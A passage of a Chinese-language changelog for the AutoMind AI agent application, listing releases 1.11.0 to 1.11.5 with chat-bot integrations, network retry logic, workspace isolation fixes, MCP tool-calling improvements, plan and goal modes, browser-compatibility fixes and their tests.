  HmacSHA256 验签，经 sessionWebhook 回复）、企业微信自建应用（URL 校验 + 消息 AES 解密，经应用消息接口回复）、
  微信公众号 / 测试号（明文与安全模式，经客服消息接口回复）、通用 Webhook（JSON 进出，支持 `wait: true` 同步取回全部回复、
  配置「结果回推地址」逐条推送 —— 个人微信可经 wechaty 等框架转发到这里）。
- **聊天即任务**：消息进来后立即应答平台（各平台都要求几秒内应答），任务在后台执行；同一个群 / 单聊共享对话上下文，
  同时只跑一个任务。过程回传分「简要 / 详细 / 只发结果」三档：计划、工具失败、审批请求立即发，普通工具调用按间隔合并，
  避免刷屏和触发平台限流；超长结果按各平台字节上限自动分条（企业微信 2KB、公众号约 2KB）。
- **聊天内审批**：危险操作的批准请求发到聊天里，回复「同意 / 拒绝 [编号]」，限时等待，超时按拒绝处理（fail-closed）。
- **聊天指令**：`/stop` 停止、`/status` 状态、`/new` 新对话、`/mode 对话|工作|编程` 切换模式、`/apply` 把隔离副本产物应用到项目、`/help`。
- **授权名单**：配置后只有名单里的用户能下达任务。
- **设置 → 🤖 机器人**：按渠道生成表单（敏感字段打码回显，保存时不会被打码值冲掉）、回调地址一键复制 / 重置令牌、
  公网地址（内网穿透）填写与本机地址提醒、平台侧配置步骤、「💬 测试对话」—— 模拟一条聊天消息真实执行并实时看到回复，
  同时显示来自平台的真实收发与回调报错（长轮询）。
- **准入**：回调 `/api/bots/hook/{id}/{令牌}` 凭每个机器人自己的随机令牌 + 平台签名，不需要平台访问令牌，
  也不受 Host 头（DNS 重绑定）检查约束（公网域名进来本来就不是本机名）；其余 `/api/bots*` 是管理动作，远程需管理员令牌。
- `/api/run` 支持服务端内部调用方按会话登记事件回调与审批通道（`_run_hooks`）；机器人任务的结果不再广播进 Web 界面。

### 新功能：网络韧性（内置插件 `net_resilience` + `automind/core/netresilience.py`）

- **根因**：`pip install` / `git clone` 时网络短暂中断，terminal 连续报错三次被熔断器关掉
  （"工具失败：terminal（已连续失败 3 次，停止重试）"），之后网络恢复了这一轮任务也再不能用 terminal。
- **自动等待 + 重试**：依赖下载、代码克隆 / 拉取、GET 请求、搜索遇到网络类失败（DNS、连接重置、超时、TLS 中断、
  代理不可达，中英文报错都认；本机端口"连接被拒绝"不算）时，先探测网络、没恢复就等（最多 60 秒），再按 2s / 5s / 10s
  退避重试最多 3 次；pip / npm 第二次重试起自动改用国内镜像（`AUTOMIND_NET_MIRROR=0` 关闭，
  `AUTOMIND_PIP_MIRROR` / `AUTOMIND_NPM_MIRROR` 可换源）。`git push`、`curl -X POST`、`npm publish` 等重做会产生
  重复副作用的调用一律不自动重试，只标注"网络问题"。
- **熔断半开**：网络类失败单独计数（阈值 6，单轮上限 12），熔断后只要探测到网络已恢复就重新放行；普通失败仍是 3 次熔断。
  界面轨迹显示「📶 工具失败：terminal（网络中断，已自动等待并重试 3 次，网络恢复后自动放行）」。
- **新工具**：`net_check`（DNS、国内外站点、PyPI / npm 源、GitHub、代理是否可达，并给出建议）、`wait_for_network`
  （网络断了时明确地等它回来，而不是换着花样重试）。
- **插件可以提供工具与分派中间件**：插件模块可导出 `get_tools()` 与 `get_middleware()`（`async mw(tool_name, kwargs, call_next)`）；
  插件工具不能顶替同名内置工具，中间件自己出错时自动跳过、不影响工具调用。
- **新内置插件默认开启**：此前保存过插件启用名单的用户，升级后新增的内置插件永远不会加载；
  现在用 `known_plugins` 记录"见过的内置插件"，新出现的默认开启，用户关掉的保持关闭。

### 修复：隔离副本产物「应用到项目」（`automind/core/workspace.py`）

- **同目录、同文件覆盖**：应用时按副本里的相对路径写到项目根的同一位置，缺失的目录自动创建，同名文件直接覆盖。
  此前"任务期间项目里也改过"的文件默认被当作冲突**跳过**（大小 + 修改时间的判定还很容易误报），点了应用却没覆盖。
  现在照样覆盖，并在结果里点名；需要旧行为时传 `skip_conflicts: true`。
- **覆盖前备份**：被覆盖的项目文件先备份到 `<副本>/_apply_backup/<时间戳>/<相对路径>`（二进制也备份），文本文件同时写进改动日志，
  「↩️ 撤销」一键还原。
- **回到复制来源的项目根**：此前一律写到"当前项目目录"，任务结束后切换过项目就会写进另一个项目；现在以副本清单里记录的来源为准。
- **产物不再漏掉**：`dist/`、`build/`、`target/` 下新生成的构建产物，以及 `.zip` / `.exe` 等文件此前不算产物、永远应用不回去；
  现在只跳过依赖目录、缓存与版本库。
- **隔离不再被绕过**：模型用项目内的绝对路径写文件、或用 `terminal` 执行命令（默认在项目根）时，此前直接改了项目本身，
  这些文件不在副本快照里；现在绝对路径映射到副本的同一相对位置，terminal 默认在副本里执行。
- **应用前预览**：新接口 `GET /api/session-workspaces/{sid}/apply-plan`；聊天里的产物卡片点「应用到项目」先列出目标项目根与
  每个文件是「新建」还是「覆盖」（标出项目里也改过的），确认后再写入，结果里给出备份目录。

### 测试

- `tests/server/test_bots.py`（18）：各渠道验签 / 解密 / 握手、指令、过程回传、聊天内审批、停止、授权名单、
  回调入口的令牌与 Host 放行、`/api/run` 回调装载与不广播。
- `tests/core/test_net_resilience.py`（37）：网络错误识别、可安全重做判定、镜像改写、等待与重试、注册表中间件、
  插件工具不顶替内置工具、熔断半开与上限。
- `tests/core/test_workspace_governance.py`：按相对路径覆盖与备份、仍可跳过冲突、嵌套目录 / 构建产物 / 二进制、
  回到来源项目根、绝对路径映射进副本。

## [1.11.5] - 2026-10-14

**右栏新增「🧭 摘要」；项目目录可直接浏览整块磁盘与桌面；新增可运行的「在线客服」工作流样板**

### 新功能

- **对话摘要（右栏「🧭 摘要」标签，默认打开）**：`web/src/components/right/SummaryTab.tsx`。一屏汇总
  - 头部：会话标题、执行中 / 空闲、当前模式、提问轮数、本次 token；
  - 🎯 当前目标（最近一次提问，可展开此前的提问）；
  - 📈 工作进度：任务进行中显示阶段、第几步 / 共几步、已用时与进度条；没有进行中的任务时显示最近一次计划的完成率；
  - 📋 任务规划：分层计划逐步状态（○ ◐ ✓ ✗）/ 多 Agent 分工 / 计划树；
  - 📦 对话产物：文件改动（点击在「代码」标签打开，HTML 直接预览）、隔离副本、工作流运行、回复中提到的文件、截图数；
  - 🧩 技能与工具：用到的专家 / 技能（含 `skill_invoke` 调用的技能名）/ MCP，以及各工具调用次数与失败次数；
  - 📝 要点摘要：点按钮才生成（新接口 `POST /api/conversation-summary`，与归档摘要同一实现：模型限时 45 秒，
    失败或未配置模型时回退抽取式），按会话缓存，对话有新进展时提示"有新进展，刷新"。
  除要点摘要外全部由本地已有状态推导，打开该标签不消耗 token。
  右栏新增 `openInCode(path)`：其它面板可以请求"在代码标签打开某文件"。
- **项目目录浏览增强**：新的目录选择器 `web/src/components/ui/DirPicker.tsx`（通用设置 → 项目目录、工作区 → 新增工作区）
  - 左侧快捷位置：桌面 / 文档（Windows 用 `SHGetFolderPathW` 取真实位置，重定向到 OneDrive / 其它盘也能找到）/ 下载 /
    主目录 / 当前项目，以及「此电脑」下的全部盘符；
  - 可编辑地址栏（回车跳转）、面包屑、当前目录过滤、显示文件（仅供辨认）、新建文件夹（`POST /api/fs/mkdir`，只建一层）；
    单击选中子目录、双击进入；
  - **本机访问时可浏览整块磁盘**（`_fs_full_disk_allowed`）。v1.4.5 的锚定防的是"局域网 + 无令牌"枚举全盘，
    本机用户本来就能在资源管理器看到这些目录，锚定只造成"项目在 D 盘选不到"。远程（带令牌）访问仍按锚点；
    系统目录（`%SystemRoot%`、`/usr`、`/etc` 等整棵子树）任何情况下都拒绝；`AUTOMIND_FS_FULL_DISK=0` 可恢复锚定行为。
    单个目录最多列 500 项，盘符根下的 `$RECYCLE.BIN` 等系统项不再显示。
- **「在线客服」工作流样板（可运行，社区版可用）**：`examples/06-workflow/customer_service.yaml`
  （随包分发版本在 `automind/workflow/samples/`）。登记会话 → 关键词分流：
  投诉 / 转人工 → 登记人工工单 → **坐席确认接管**（human）→ 回复；退款 / 物流 / 发票 → 固定话术（零 token）；
  其余 → Agent 只读知识库作答（`allowed_tools: [file_read, file_write]`）。附示例知识库 `customer-service-kb.md`。
  界面「🔀 工作流 → ＋ 新建」顶部新增「可直接运行的内置样板」，一键安装（YAML + 知识库写进 `workflows/`，
  已存在的文件不覆盖）后直接打开运行页（`GET /api/workflow/samples`、`POST /api/workflow/samples/{id}/install`）。
- **branch 条件新增 `contains_any`**：左侧文本包含右侧列表中任一项，右侧写法同 `in`
  （`{{ inputs.message }} contains_any [退款, 退货]`）。仍是白名单比较、不求值；空关键词不算命中，空列表加载期报错。

### 测试

- `tests/workflow/test_customer_service.py`：样板校验 / 各分支真跑落到正确回复 / 投诉路径在无审批通道时停在人工步骤
  （fail-closed）/ 随包样板与 examples 版本一致 / `contains_any` 解析、加载期报错与求值。
- `tests/server/test_fs_browse_v1115.py`：本机全盘浏览、远程仍锚定、系统目录拒绝、快捷位置、显示文件、新建文件夹的校验。
- `tests/server/test_v1115_api.py`：样板列表与安装（不覆盖已存在文件）、对话要点摘要接口。

## [1.11.4] - 2026-10-08

**修复"界面未能加载：页面脚本未能正常运行（HTTP 200）"；旧内核里点「＋」「设置」保证出现菜单；初始欢迎页与左侧子页面视觉升级**

### 根因 / 修复

- **"页面脚本未能正常运行，通常是浏览器/内核版本过旧（HTTP 200）"其实不是内核问题**：脚本能下载（200），
  却在 `<script>` 上触发加载错误 —— 这是**服务端下发的 Content-Type 不对**的特征。Windows 上 Python 的
  `mimetypes` 会读注册表 `HKCR\.js\Content Type`，不少软件（旧版 IE 组件、某些编辑器 / 安全软件 / 开发工具）
  把它改成了 `text/plain`；StaticFiles 据此下发 `text/plain`，再叠加我们自己的 `X-Content-Type-Options: nosniff`，
  浏览器拒绝执行模块脚本、也拒绝应用样式表。**「打开兼容版界面」同样失效**（经典界面的脚本也被拒）。
  复现：把系统 MIME 表改成 `.js → text/plain` 后，主界面、样式与经典界面脚本全部以 `text/plain` 下发。
  修复：`automind/server_web.py` 新增权威类型表，启动时写回 `mimetypes`，并在响应出口对 `/static/` 下的资源
  按扩展名强制正确的 `Content-Type`（即使之后有库再次读入注册表也不受影响）。
- **启动页自愈**（对旧版服务端 / 改写类型的代理同样有效）：脚本能下载却没执行时，重新拉取正文、以正确类型从
  Blob URL 加载；样式表被拒时 Chrome **不触发 error 事件**（实测），改为页面加载后主动检查（同源样式表读
  `cssRules` 抛 SecurityError、或主样式的 `--bg0` 变量不存在即视为失效）并注入为 `<style>`。用一个故意以
  `text/plain + nosniff` 下发的测试服务器验证：脚本与样式均自愈，界面完整显示。CSP 的 `script-src` 增加 `blob:`
  （已允许 `'unsafe-inline'`，不扩大攻击面）。报错文案按真实原因区分：类型不对 / 被拦截 / 缓存旧页面。
- **启动页本身在旧内核里失去定位**：`index.html` 的内联样式不经过构建降级，此前用了 `inset`（Chrome < 87 整条忽略）
  与 flex `gap`。改为四边定位与外边距，并加 `-webkit-` 前缀。
- **旧内核里点「＋」「设置」仍可能看不到菜单**：v1.11.3 修了 antd 样式那一环，但弹层还依赖进出场动画
  （`animationend` 才算出场完成）与对齐计算，任何一环出问题菜单都会"打开了却看不见"。新增
  `SafeDropdown`（`web/src/components/ui/SafeDropdown.tsx`）：旧内核直接使用自绘的兼容菜单；其余浏览器照常用 antd，
  但每次点击后 450ms 检查弹层是否真的可见（在视口内、不透明），不可见就当场换成兼容菜单并记住。兼容菜单只用
  fixed 定位 + 朴素 CSS（无动画、无 inset / flex gap / :where / 逻辑属性 / min()），支持分组、分隔线、子菜单
  （就地展开，触屏可用）、禁用与危险项。复现与验证：在现代浏览器里实时删除含 `:where(` 的样式规则，antd 弹层
  落在 `top: 834`（视口外）；一次点击后兼容菜单完整出现在视口内，子菜单与菜单项动作均正常。
  旧内核同时关闭 antd 动画（`token.motion = false`）。排障：`?menu=simple` 强制兼容菜单，`?menu=antd` 恢复。

### 界面

- **初始欢迎页**：从"写满字的气泡"改为欢迎页 —— 品牌标识与渐变标题；未配置模型时醒目的「去配置 API Key」引导；
  五种模式卡片（点击即切换，专业版功能点击进入升级面板，当前模式高亮）；快速开始模板卡片（图标 + 标题 + 说明）；
  `/` 指令、`@` 引用等输入技巧提示。
- **启动加载页**：圆角渐变标识、柔和漂移的背景光晕、渐变品牌字、加载进度条；出错时为卡片式提示。
- **左侧导航子页面**：统一页头卡片（大图标块 + 标题 + 一句说明 + 右侧操作区），安全审计 / 观测中心 / 路由与成本 /
  定时任务改用统一页头（此前是各写各的 `<h3>`），操作按钮与标签放进页头右侧；子页面卡片、表格、分段控件统一圆角与描边，
  页面最大宽度放宽到 1120px、顶部留白加大。

### 测试

- `tests/server/test_static_mime_types.py`（5）：系统 MIME 表被改坏时主界面 / 样式 / 经典界面脚本仍以正确类型下发、
  404 不被改成脚本类型、只处理 `/static/` 路径、CSP 允许 blob 自愈。

## [1.11.3] - 2026-10-07

**修复部分浏览器里点「设置」「＋」没有任何反应；增强旧内核浏览器兼容性**

### 根因 / 修复

- **下拉菜单在旧内核里看不到**：antd 5 的 CSS-in-JS 默认 `hashPriority: 'low'`，每条组件样式都包在
  `:where(.css-xxx)` 里，并大量使用 `inset-inline-start` 等逻辑属性。不认识 `:where()` 的内核
  （Chrome / Edge < 88、Safari < 14、Firefox < 78，以及 360 / QQ / 搜狗等浏览器的旧 Chromium 内核、
  被组策略钉住的旧 WebView2）会把这些规则**整条丢掉**：下拉弹层失去 `position:absolute` 与 `z-index`，
  被渲染到 `<body>` 末尾的文档流里，而 `body` 是 `overflow:hidden` —— 点「＋」「设置」时菜单其实打开了，
  却落在屏幕外。复现：在现代浏览器里实时删除所有含 `:where(` 的样式规则（等同旧内核的行为），
  弹层变为 `position: static`、`top: 1170px`（视口高 922px）。
  现在启动时探测浏览器能力（`web/src/lib/compat.ts`）：不支持 `:where()` 时改用 antd 的
  `hashPriority: 'high'` 输出，不支持逻辑属性时启用 `legacyLogicalPropertiesTransformer`
  （antd 官方兼容方案）；同样的模拟环境下弹层恢复为 `position: absolute`、`z-index: 1050`、完整位于视口内。
  现代浏览器保持原样输出，不受影响。排障时可用地址栏 `?compat=legacy` / `?compat=modern` 强制指定（会记住）。
- **会话行「⋯」菜单按钮在旧内核里一直透明**：`.conv-more:focus-visible` 与其它选择器写在同一个选择器列表里，
  不认识 `:focus-visible` 的内核（Chrome < 86 / Safari < 15.4）会丢掉整条规则。现已拆开。
- **旧内核缺少的 API**：构建目标 es2017 只降级语法、不补 API，产物里有未加判断的 `Object.fromEntries`、
  `Array#flat` / `flatMap`、`Promise.allSettled`。新增 `web/src/polyfills.ts`（最先加载，只在缺失时定义，不覆盖原生实现）。
- `min()` 写法补上普通数值兜底（Chrome < 79 / Safari < 11.1 会丢掉整条声明）。
- 构建配置 `resolve.dedupe` 锁定唯一一份 `@ant-design/cssinjs` / React —— 兼容开关只对同一份 cssinjs 生效，
  依赖树里出现两份时会静默失效；`@ant-design/cssinjs` 改为显式依赖（锁定文件同步）。

## [1.11.2] - 2026-10-07

**输入框支持 / 指令与 @ 引用文件、目录、对话；＋ 菜单与对话区重新设计；MCP / 技能 / 插件工具调用成功率大幅提升**

### 根因 / 修复（工具调用成功率）

- **MCP SDK 2.x 下一个 MCP 服务器都连不上**：`mcp` 2.x 的 `Tool` 字段改成了 `input_schema`（1.x 是 `inputSchema`），
  `connect_server` 读 `tool.inputSchema` 抛 AttributeError，又被 `except Exception: return False` 吞掉 —— 界面上只看到
  "连接失败"，日志里什么也没有。现在两种写法都认（结果字段 `is_error` / `isError`、`structured_content` /
  `structuredContent` 同理），连接失败的真实原因（找不到命令 / 握手超时 / SDK 未装…）记录下来，`/api/mcp` 与添加 / 导入接口都会返回。
- **MCP 工具报错被当成成功**：MCP 的工具错误以 `isError=True` 的结果返回而不是抛异常，旧代码一律 `success=True`，
  并把整个结果对象的 repr 交给模型。现在按 `isError` 判成败，内容整理成纯文本（图片 / 音频只留说明，文本与重复的
  `{"result": …}` 不再给两份）。
- **MCP 调用没有超时**：服务器卡住时任务永远挂着。现在单次调用默认 60 秒（`AUTOMIND_MCP_TIMEOUT_S` 可调）。
- **MCP 服务器进程退出后再也调不通**：会话对象还在、管道已断。现在请求发出前就发现会话已断 → 自动重连并重试；
  请求发出后才断开 → 只重连、**不重试**（工具可能已经执行了一半），如实告诉模型"该操作可能部分生效，先确认再重试"。
- **MCP 工具清单只取第一页**：`list_tools` 是分页的，大服务器后半截工具从未注册。现在按游标拉全。
- **导入的 MCP 配置丢了 `env`**：Claude Desktop 格式里的 `env`（API Key 等）此前在导入 / 添加 / 重启恢复时都被丢掉，
  需要密钥的服务器起不来。现在保存并传给服务器进程（在系统环境变量基础上叠加，`npx` / `uvx` 仍能找到 PATH）。
- 模型给可选参数传 `null` 时原样转发、被服务器端 schema 校验拒掉 —— 现在剥掉不允许 null 的空参数。
- **命名空间工具名解析不到**：模型几乎从不照抄 `mcp__github__create_issue`，而是写 `github.create_issue` /
  `github_create_issue` / `create_issue` / `plugin_weather` 写成 `weather`。`resolve_name` 新增两级匹配：去掉命名空间后的
  服务器+工具组合、以及唯一的工具本名；有歧义（两个服务器都有 `create_issue`）或只是猜测（`read` → `file_read`）时仍不替模型做主。
- **技能名被当成工具名直接调用**：现在 `ToolRegistry.add_fallback` 改道到 `skill_invoke`（只在唯一确定时）。
- **`skill_invoke` 太挑输入**：技能名必须一字不差；模型传纯文本时 Python 技能在内部炸成 `'str' object has no attribute …`；
  参数平铺在顶层时被忽略。现在技能名按大小写 / 分隔符容错，JSON 字符串自动解析，纯文本填进唯一的必填字符串字段，
  平铺参数并入输入，并按输入模型预校验 —— 失败时列出缺哪些字段、各是什么类型。
- **MCP / 插件工具很少被选中下发**：ReAct 的工具预算按关键词打分，而这些工具没有内置中文别名。现在额外按"点名了 MCP 服务器名"
  与"工具描述和任务的词面重合"（英文词 + 中文二元组）打分；模型在思考里写 `github.create_issue` 这类简写也会补发完整 schema。
  MCP 工具描述前加上 `[MCP · 服务器名]`，模型更容易把"用 GitHub 连接器"和工具对上。

### 新增

- **⌘ / 指令**：输入框行首输入 `/` 或 `./` 弹出指令面板（正文里的 `a/b`、`./build.sh` 不会误触），按分组列出：
  操作（`/new` `/clear` `/plan` `/goal` `/schedule` `/workflow` `/templates` `/browser` `/model` `/keys` `/settings`
  `/workspace` `/theme` `/upgrade` `/help`）、本条模式（`/chat` `/work` `/coding` `/multi` `/loop`）、提示词模板
  （`/explain` `/fix` `/test` `/review` `/refactor` `/summarize` `/translate` `/doc`）、技能、MCP 连接器、插件 / MCP 单个工具 / 内置工具、专家。
  支持拼音与英文别名模糊匹配；↑↓ 选择、Enter / Tab 确认、Esc 关闭。
- **＠ 引用**：输入 `@`（前面是空白或行首，邮箱不误触）弹出项目文件 / 目录（新接口 `GET /api/files/search`，按文件名前缀 >
  包含 > 路径 > 子序列排序，排除依赖与缓存目录）与其它对话。新 overrides 键 `mentions`：服务端读取文件（单个 ≤ 6 万字符、
  合计 ≤ 20 万字符）、列出目录树、带上被引用对话的记录与要点；越界路径、平台密钥文件、二进制文件、不存在的路径逐项回执原因。
  正文里手打的 `@src/app.py` 只要是真实存在的项目文件也会被引用；从输入框删掉的 @ 引用不会发送。
- **指定工具**：新 overrides 键 `tools`（/ 指令选中的工具）：按容错规则解析为真名后必定下发，并在任务前写明"优先使用"。
- ＋ 菜单新增「＠ 引用文件或对话」「⌘ 调用指令」入口；`/clear` 与顶栏「清空」走同一个确认流程。

### 界面

- **＋ 菜单重新设计**：分为「输入 / 本条消息 / 工作方式」三组；每项是图标方块 + 标题 + 一句说明 + 快捷键提示，
  已选状态用 ✓ 与高亮图标标出，子菜单同样样式；菜单打开时 ＋ 旋转为 ×。
- **指令 / 引用面板**：贴在输入卡片上方的毛玻璃面板，分组标题吸顶、当前项左侧渐变指示条，文件显示完整路径与大小。
- **对话区**：Markdown 表格圆角 + 斑马纹、一 / 二级标题加分隔线、引用块渐变边、列表符号用主题色、行内代码加细边；
  输入卡片聚焦时工具栏上方出现分隔线；@ 引用 chip 用主题色区分。

### 测试

- `tests/tools/test_tool_success_v1112.py`（24）：命名空间工具名解析与歧义保护、未知名改道与钩子异常隔离、技能名改道、
  技能输入整形（纯文本 / JSON / 平铺 / 校验报错）、MCP 结果整理（isError、1.x 字段、重复结构化结果、图片）、null 剥离、
  **真实 MCP stdio 服务器**往返（简写名 + 类型纠正 + null 剥离、isError 判失败、env 透传、找不到命令的原因）。
- `tests/server/test_mentions_and_tool_refs.py`（15）：文件查找排序 / 子序列 / 排除依赖目录、文件与目录注入、
  越界 / 密钥文件 / 二进制 / 不存在逐项回执、手打 @路径识别（@人名不误伤）、对话引用、数量上限、指定工具解析与必下发。

## [1.11.1] - 2026-10-07

**浏览器自动化更可靠并可在右栏实时预览；应用内一步升级专业版 / 企业版（免 pip、免重启）；输入框新增定时任务入口；界面美化与浏览器兼容**

### 根因 / 修复

- **浏览器截图把模型上下文塞满乱码**：`browser` 的 `screenshot` 把整张 PNG 的 base64 放进工具输出，
  `limited_tool_content` 再把它夹成"头 7000 + 尾 3000"字符的乱码交给模型 —— 每截一次图白烧三四千 token，
  还挤掉了真正有用的上下文。现在截图落盘（`<数据目录>/screenshots/`）只回路径；`output_budget.scrub_binary`
  另把任何工具输出里的 base64 大字段换成一句说明（按字段名或字符分布识别，"aaaa…"、长哈希这类正常输出不受影响）。
- **并发会话共用同一个浏览器页面**：工具注册表在会话克隆之间共享，`BrowserTool` 只有一个 `_page` ——
  两个会话同时开网页会互相跳走、登录态互串。现在一个浏览器进程、每个会话一个独立 `BrowserContext`。
- **浏览器启动"装了但起不来"直接放弃**：某个通道（如 Edge 被安全软件 / 组策略拦截、配置目录不可写）
  启动崩溃时此前立刻报错，不再尝试机器上的其它浏览器。现在逐个通道尝试，全部失败才报告第一个真实原因；
  Playwright 几 KB 的启动日志只取第一行，不再把整个对话区撑成一面红墙。
- **点击被透明遮罩挡住时"成功"却没点中**：改为直接在元素上派发 DOM 点击，而不是 `force=True` 按坐标点（点到的恰恰是遮罩）。
- **浏览器画面只在 ReAct 路径可见**：截图预览此前只在 ReAct 的 `on_action` 回调里提取；计划执行与工作流里的浏览器步骤看不到画面。
  现在经会话上下文里的事件回调（`session_ctx.bind_session(..., sink=)`）由工具直接推送，所有执行路径一致。
- **特性开关变化后 🔒 不消失**：组件普遍只订阅 `featureOn` 这个稳定的函数引用，特性表更新不触发重渲染。
  现在特性表每次变化都换一个新的 `featureOn`。
- **窄窗口把右栏挤出屏幕**：对话列是 flex 子项、`min-width:auto`，不肯比欢迎卡片 / 输入卡片更窄（实测 856px 宽时右栏只露出一半）。

### 新增

- **🌐 右栏「浏览器」实时预览**：每次页面变化类动作（打开 / 点击 / 输入 / 选择 / 按键 / 滚动 / 前进后退刷新）后推一帧
  JPEG 画面（事件 `browser_preview`，带 `action` / `url` / `title`）；右栏新标签显示最新画面、地址栏、操作胶片条（最近 16 帧，
  可回看）、点击放大；第一帧到来时自动切到该标签（不打断正在看代码的人）。对话区只放模型主动要的截图，不再每步刷屏。
  新接口 `GET /api/browser/status`（空状态里的"检测浏览器环境"）。
- **🎯 浏览器动作**：`snapshot`（给可交互元素编号，返回 `[编号] 类型 "文字"` 清单）+ 所有定位动作支持 `ref`；
  `selector` 未命中时依次按按钮 / 链接名、placeholder、label、可见文本兜底；新增 `select` / `hover` / `forward` / `reload` / `close`，
  `type` 支持 `submit`，`scroll` 支持方向；单步超时 8s（导航 30s）；浏览器崩溃 / 页面被关自动重开、网络抖动类错误对幂等动作重试一次；
  富文本编辑器不支持 fill 时逐字输入；新标签页自动接管；原生 alert / confirm 自动确认；报错改为"下一步该怎么做"的中文指引。
  `AUTOMIND_BROWSER_HEADLESS=0` 可弹出可见窗口。
- **⭐ 应用内升级（社区版 → 商业版）**：新接口 `GET /api/license`（当前版本 / 扩展包 / 许可证 / 卡在哪一步）、
  `POST /api/license/package`（上传 automind-pro 的 .whl，解压到 `<数据目录>/extensions/`，**免 pip**，冻结的桌面版同样可用；
  只接受 `automind_pro/` 与它自己的 dist-info，拒绝其它顶层内容与越界路径）、`POST /api/license/activate`
  （**有效才落盘**到 `~/.automind/license`，随后就地重新激活；新特性的路由**热挂载**到 403 降级路由之前、调度循环当场启动，**免重启**；
  已在用的特性保留原实例）。三者均属管理动作（远程需管理员令牌）。界面新增「升级与许可证」面板（设置菜单 / 左上角版本徽标 /
  任何 🔒 入口均可进入）；版本变化经 WebSocket `edition_changed` 通知所有标签页。
- **⏰ 输入框定时任务入口**：输入卡片下方「⏰ 定时」与「＋ → ⏰ 设为定时任务…」，把正在写的内容带进新建对话框
  （频率预设 + 自定义、执行模式、名称）；社区版显示升级入口。
- **🧭 界面**：左侧「系统」分组默认收起（新存储键，老用户同样生效），收起时仍显示当前所在页面，图标栏模式下用「⋯」展开；
  右栏改为「📊 面板 / 🌐 浏览器 / 📄 代码」三标签，可收起成细栏（窄于 1100px 的窗口默认收起），新画面在图标上亮点提示；
  工作流步骤报错限高滚动；对话区网页截图可点击放大。

### 兼容

- 构建新增 `cssTarget: ['chrome61', 'edge79', 'firefox68', 'safari12']`：esbuild 自动把 `inset` 降级为四边定位
  （Chromium < 87 整条忽略 → 遮罩错位），给 `backdrop-filter` 补 `-webkit-` 前缀（Safari < 18 毛玻璃失效）。
- Firefox 用标准 `scrollbar-width` / `scrollbar-color` 得到同样细的滚动条；不支持毛玻璃的内核退回不透明底色；
  `color-scheme` 让原生控件跟随深浅主题；高度链改为 100% 继承（含 antd 的 `.ant-app` 包装层），规避移动端 100vh 含地址栏的问题；
  读取许可证文件改用 `new Response(file).text()`（`Blob.text()` 需 Chromium 76+）。

### 测试

- `pro/tests/test_in_app_upgrade.py`（14）：无效许可证不落盘、有效许可证就地激活、专业版 → 企业版保留已在用实例、
  热挂载后真实路由优先于 403 降级路由、接口 400 回执、扩展包校验（非 zip / 缺包 / 越界路径 / 夹带其它包）与解压。
- 手工端到端：本地服务上传 wheel → 激活许可证 → `/api/schedule` 由 403 变 200、重启后仍为专业版；
  工作流里的浏览器步骤（打开 → 按 placeholder 输入 → 按文字点击 → 读结果）画面实时出现在右栏。

## [1.11.0] - 2026-10-05

**长任务不再到 50 万 token 就中断；目标交付模式；计划模式；输入框可引用 MCP 连接器与技能**

一批四项，依据 `分析报告/AutoMind-四项更新可行性评估-v1.11.0.md`。

### 根因 / 修复

- **长任务"到 50 万 token 就中断"**：`task_token_budget`（默认 500,000）一满，`_pre_call` 就拒绝之后的
  模型调用、任务交部分交付清单收尾；而前端 `ws.ts` 不认 `budget_warning` / `budget_exceeded` 两个事件，
  用户看到的就是任务"安静地停住"。现在预算是**一个窗口**：用满时先压缩上下文，再续开新窗口接着跑
  （累计用量照记照报），由新配置 `execution.budget_auto_continue`（默认 10，0 = 关闭即旧行为）限制续开次数，
  总花费上限 ≈ 预算 ×（1 + 续开次数），成本护栏仍在。每续开一个窗口，整轮墙钟预算（`max_task_seconds`）
  同步顺延一份并推给正在跑的 ReAct / Plan 执行器 —— 否则续开后马上又撞上 30 分钟墙钟，换个名字再中断一次。
- **`task_token_budget = 0` 语义与其它闸门相反**：此前 0 回落到派生值 `max_tokens × 10`（81,920），用户填 0
  求"不限"结果预算缩到六分之一。现在 0 = 不设限（与 `max_task_seconds` / `react_tool_budget` 一致），
  负数沿用旧派生值。
- **引用了却不生效**：ReAct 的工具下发按关键词打分、有数量上限，没有"强制包含"的参数 —— 引用某个 MCP 连接器后，
  它的工具很可能根本没下发给模型。新增 `ReActExecutor(prefer_tools=...)`，被引用的工具不参与打分、必下发。
- **技能对模型完全不可达**：`MarkdownSkill.instructions()` 写好了却零调用者，技能正文从未进过任何提示词；
  模型也没有任何调用技能的工具。现在引用时注入指令，并新增统一工具 `skill_invoke`（按名字调用已安装技能）。

### 新增

- **🎯 目标交付模式**：新模块 `automind/goals.py`（`<数据目录>/goals.json`，按浏览器会话 + 工作区隔离）。
  目标 = 标题 + 期望交付物 + 验收标准 + 状态（进行中 / 暂停 / 已完成 / 归档）+ 推进记录。带着目标发消息时注入
  目标、交付物、验收标准与最近 5 轮进度（给事实，不替模型做决定），要求模型在末尾写「目标进度：…」；
  任务结束（成功 / 失败 / 被停止）都记一条推进记录，进度行取自**完整**输出（历史记录里的输出是截断版）。
  模型写「【目标已达成】」只标"待确认完成"，由人确认。新接口 `GET/POST /api/goals`、`GET/PATCH/DELETE /api/goals/{id}`。
- **📋 计划模式**：overrides 新键 `plan_review`。本条走工作模式，计划生成后经同一条审批链路
  （`make_approval_callback`，超时 / 断连 / 多标签页补发现成）交人审：批准 → 执行；修改步骤后批准 →
  以用户步骤为约束重新规划一次后执行；拒绝 / 超时按拒绝 / 通道异常 → 一步不执行（fail-closed），
  不做验收与反思、不再花钱，检查点标为不可续跑（续跑会绕过审批）。多智能体 / 循环工程与 HTTP 接口不支持，回执说明。
- **🔌 / 🧩 MCP 连接器与技能引用**：overrides 新键 `mcp: [服务器名]`、`skills: [技能名]`（每类最多 8 个，
  技能指令注入总量 ≤ 12,000 字符），与专家引用同构：逐项回执（已下发几个工具 / 指令已注入 / 未连接 / 已卸载）。
- **Web**：输入卡片下方新增常驻开关「📋 计划」「🎯 目标」（按工作区记住）；「＋」菜单新增「🔌 引用 MCP 连接器」
  「🧩 引用技能」「📋 进入 / 退出计划模式」「🎯 目标交付」；新「目标交付模式」面板（列表 / 新建 / 详情时间线 /
  暂停 / 完成 / 归档 / 挂到输入框）；审批弹窗新增"计划审批"形态（批准并执行 / 修改计划 / 放弃）；
  对话区展示 🪙 预算预警 / 窗口续开 / 用尽与 📋 计划审批进度、🎯 目标推进提示；
  设置 → 执行治理新增「预算窗口自动续开次数」。

### 测试

- `tests/planning/test_budget_windows.py`（7）：窗口用尽先压缩再续开、续开次数用完才收尾、0 = 旧行为、
  墙钟随窗口顺延并推给执行器、预警带剩余窗口数、执行器接线、默认开启。
